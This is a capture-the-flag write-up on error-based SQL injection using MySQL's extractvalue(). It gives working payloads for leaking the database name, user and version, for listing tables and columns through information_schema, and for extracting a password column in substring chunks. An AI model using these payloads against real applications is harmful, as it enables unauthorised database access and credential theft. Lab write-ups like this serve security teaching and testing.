# SHODAN WRITE UP - SQLI ERROR

> Tags : sql  
> Difficulty : medium  
> Attack type : error-based xpath sql injection  

This challenge is the continuation of the walkthrough sql injection.  
On this one, unlike sqli easy, we will focus on a different vector: the errors generated by the database.  
Here we will use the XPATH `extractvalue()` function in order to generate errors and modify the output in an arbitrary manner.  

For each query that we will send, if the XPATH syntax is incorrect, we will receive an error message, which is of interest to us here.  
Indeed, it is not always possible to use UNION based injection, and errors can allow us to extract data.  

When arriving on the site, we find our article search field (checking the vulnerability of the input with the keyword IGNOREME in the source code).  
We can start injecting payloads.  
As for the sqli easy, let's start with the most basic payload : `' OR 1=1 #`.  

As a reminder, here is an assumption of the query present on the server side:  
```sql
SELECT * FROM item WHERE item_name = '$user_input' [...]
```
The starting quote in our payload therefore serves to close the field in which a word is contained, and the ending hashtag, comment in SQL, is used not to interpret the rest of the initial request (including the IGNOREME).    
As for `OR 1=1`, it allows you to generate the following request:    
```sql
SELECT * FROM item WHERE item_name = '' OR 1=1
```
`1=1` being always true, the database is supposed to return to us all that contains `item`.  

![sql-error-dump](/images/sql-error-dump.png)

Now let's try a payload that will cause an error, using the function provided for this purpose, `extractvalue()`.  
```sql
' OR 1=1 AND extractvalue(rand(),concat(0x0a,database())) #
```
The `extractvalue()` function take as argument xml, and a sql query.  
Here, by using `rand()`, the function will return an error, which will contain the result of our SQL request.  
To make it simple, we will extract here using the function `database()`the name of our database.  

![sql-error-db](/images/sql-error-db.png)

We can also extract the unix user from the server.  
```sql
' OR 1=1 AND extractvalue(rand(),concat(0x0a,user())) #
```

![sql-error-user](/images/sql-error-user.png)

Finally, among others, it is possible to extract the version of the database.  
```sql
' OR 1=1 AND extractvalue(rand(),concat(0x0a,version())) #
```

![sql-error-version](/images/sql-error-version.png)

Now let's go deeper to extract the data that interests us.  
We must first descend from a layer to know the tables contained in our database, then the columns of each table, in order to be able to extract data.   
Small complexity on an XPATH injection: the error cannot exceed 32 characters.  
So we will have to format our output so that it remains readable.  

Here is the payload used to extract our tables:   
```sql
' OR 1=1 AND extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit x,1))) #
```

The `x` is an `offset`, which allows us to retrieve the tables one by one, by their index.  
We must therefore test each offset to see the existing tables, until we no longer have a result.  
Here, the table that interests us is offset 5 : `customer`.  

![sql-error-table](/images/sql-error-table.png)

Now let's try to find the columns in this table.  
Same principle, we will create a payload that retrieves the names of the columns, specifying an offset to direct us manually.  
```sql
' OR 1=1 AND extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_name='customer' limit x,1))) #
```

![sql-error-column](/images/sql-error-column.png)

The column that interests us is at offset 3, and contains the `password` of all users.  
It only remains for us to extract the flag.  
For this we need to specify two things.  
We are looking for a 128 character password, and must cross-check it with the `substring()` function so as not to exceed the 32 character limit. Then, we will move the offset `x` of our substring in order to go to the end of the flag.  
```sql
' OR 1=1 AND extractvalue(0x0a, concat(0x0a, (select substring(password,x,31) from customer where length(password) = 128))) #
```

![sql-error-flag](/images/sql-error-flag.png)

After having made these manipulations, it only remains for us to enter the flag on the platform.  